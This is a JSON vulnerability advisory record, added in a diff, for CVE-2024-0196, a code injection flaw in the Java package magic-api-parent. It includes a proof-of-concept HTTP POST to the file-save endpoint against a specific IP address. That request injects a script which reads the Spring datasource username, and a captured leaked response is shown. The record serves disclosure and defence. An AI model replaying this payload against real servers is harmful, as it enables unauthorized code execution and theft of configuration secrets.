@@ -1,0 +1,44 @@
+{
+    "CVSSv3": {
+        "CVSS": "3.1",
+        "E": "P",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "LOW",
+        "userInteraction": "NONE",
+        "scope": "UNCHANGED",
+        "confidentiality": "LOW",
+        "integrity": "LOW",
+        "availability": "LOW"
+    },
+    "credit": [
+        "Puppy"
+    ],
+    "cvssDetails": [],
+    "cvssScore": 6.3,
+    "disclosureTime": "2024-01-02 22:45:19",
+    "epssDetails": null,
+    "exploitMaturity": "Proof of Concept",
+    "id": "SNYK-JAVA-ORGSSSSSSSS-6143092",
+    "identifiers": {
+        "CVE": [
+            "CVE-2024-0196"
+        ],
+        "CWE": [
+            "CWE-94"
+        ]
+    },
+    "language": "java",
+    "malicious": false,
+    "packageManager": "maven",
+    "publicationTime": "2024-01-03 16:53:52",
+    "remediation": "There is no fixed version for org.ssssssss:magic-api-parent . ",
+    "severity": "medium",
+    "socialTrendAlert": false,
+    "title": "Code Injection",
+    "vulnDescription": {
+        "Overview": "Affected versions of this package are vulnerable to Code Injection via the /resource/file/api/save?auto=1 file. An attacker can inject and execute arbitrary code by manipulating the input to this file resource. ",
+        "PoC": "POST /resource/file/api/save?auto=1 HTTP/1.1 Host: 60.205.225.252:8080 Content-Length: 1812 Accept: application/json, text/plain, */* magic-token: unauthorization User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Content-Type: application/json Origin: http://60.205.225.252:8080 Referer: http://60.205.225.252:8080/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close {\"id\":\"ed8ea909935c447fb28bb424ed110700\",\"name\":\"abc\",\"path\":\"a\",\"groupId\":\"234ec5f76be84f40a6838d7cf53b931d\",\"lock\":null,\"method\":\"GET\",\"description\":null,\"createBy\":null,\"properties\":{},\"script\":\"import env;\\r\\n\\r\\nreturn env.get('spring.datasource.username')\",\"responseBody\":\"{\\n \\\"code\\\": 1,\\n \\\"message\\\": \\\"success\\\",\\n \\\"data\\\": \\\"jdbc:mysql://localhost:3306/magic-api-test?allowMultiQueries=true&useUnicode=true&characterEncoding=UTF-8\\\",\\n \\\"timestamp\\\": 1692500175894,\\n \\\"executeTime\\\": 2\\n}\",\"responseBodyDefinition\":{\"name\":\"\",\"value\":\"\",\"description\":\"\",\"required\":false,\"dataType\":\"Object\",\"type\":null,\"defaultValue\":null,\"validateType\":\"\",\"error\":\"\",\"expression\":\"\",\"children\":[{\"name\":\"code\",\"value\":\"1\",\"description\":\"\",\"required\":false,\"dataType\":\"Integer\",\"type\":null,\"defaultValue\":null,\"validateType\":\"\",\"error\":\"\",\"expression\":\"\",\"children\":[]},{\"name\":\"message\",\"value\":\"success\",\"description\":\"\",\"required\":false,\"dataType\":\"String\",\"type\":null,\"defaultValue\":null,\"validateType\":\"\",\"error\":\"\",\"expression\":\"\",\"children\":[]},{\"name\":\"data\",\"value\":\"jdbc:mysql://localhost:3306/magic-api-test?allowMultiQueries=true&useUnicode=true&characterEncoding=UTF-8\",\"description\":\"\",\"required\":false,\"dataType\":\"String\",\"type\":null,\"defaultValue\":null,\"validateType\":\"\",\"error\":\"\",\"expression\":\"\",\"children\":[]},{\"name\":\"timestamp\",\"value\":\"1692500175894\",\"description\":\"\",\"required\":false,\"dataType\":\"Long\",\"type\":null,\"defaultValue\":null,\"validateType\":\"\",\"error\":\"\",\"expression\":\"\",\"children\":[]},{\"name\":\"executeTime\",\"value\":\"2\",\"description\":\"\",\"required\":false,\"dataType\":\"Integer\",\"type\":null,\"defaultValue\":null,\"validateType\":\"\",\"error\":\"\",\"expression\":\"\",\"children\":[]}]},\"requestBody\":\"\",\"requestBodyDefinition\":null,\"parameters\":[],\"headers\":[],\"paths\":[],\"options\":[]} "
+    },
+    "source_code": []
+}
